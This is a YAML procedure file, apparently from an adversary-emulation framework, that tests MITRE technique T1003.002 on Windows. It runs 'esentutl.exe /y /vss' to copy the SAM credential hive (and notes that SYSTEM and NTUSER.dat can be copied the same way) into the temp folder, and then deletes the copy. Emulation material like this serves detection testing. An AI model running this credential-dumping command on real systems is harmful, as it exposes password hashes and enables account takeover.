api_version: "2.0"
name: esentutl.exe SAM copy
description: |
    Copy the SAM hive using the esentutl.exe utility
    This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.
args:
    - name: file_path
      type: path
      default: '%SystemRoot%/system32/config/SAM'
    - name: file_name
      type: string
      default: SAM
    - name: copy_dest
      type: string
      default: '%temp%'
uuid: a90c2f4d-6726-444e-99d2-a00cd7c20480
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.002: Security Account Manager'
requirements:
    platforms:
        - os: windows
steps:
    - name: esentutl.exe-sam-copy
      inline: |
        esentutl.exe /y /vss {{.Args.file_path}} /d {{.Args.copy_dest}}/{{.Args.file_name}}
      executor: command_prompt
      cleanup:
        inline: |
            del {{.Args.copy_dest}}\{{.Args.file_name}} >nul 2>&1
        executor: command_prompt
